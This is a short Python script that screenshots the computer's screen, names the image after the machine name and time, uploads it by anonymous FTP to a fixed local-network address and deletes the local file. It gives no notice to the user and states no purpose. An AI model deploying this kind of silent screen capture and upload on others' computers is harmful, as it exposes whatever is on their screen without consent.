# coding:utf-8
# pip install pyautogui
import pyautogui as picture
import ftplib
import os
import time

# Variables
date = time.strftime("%Y%m%d_%H%M")
pc_name = os.environ['COMPUTERNAME']
screenshot_name = pc_name + '_' + date + '.jpg'



def upload_ftp(file_path):
    session = ftplib.FTP('192.168.35.68')           #set host
    session.login()                                 #login
    file = open(str(file_path) ,'rb')               # file to send
    session.storbinary("STOR screenshots/" + screenshot_name, file)   # send the file
    file.close()                                    # close file and FTP
    session.quit()
    # Suppression du screenshot uploadé
    os.remove(screenshot_name)


def screenshot():
    # Variables
    date = time.strftime("%Y%m%d_%H%M")
    pc_name = os.environ['COMPUTERNAME']
    screenshot_name = pc_name + '_' + date + '.jpg'
    # Take screenshot
    pic = picture.screenshot()
    # Save the image
    pic.save(screenshot_name)
    return screenshot_name

def main():
    upload_ftp(screenshot())

main()
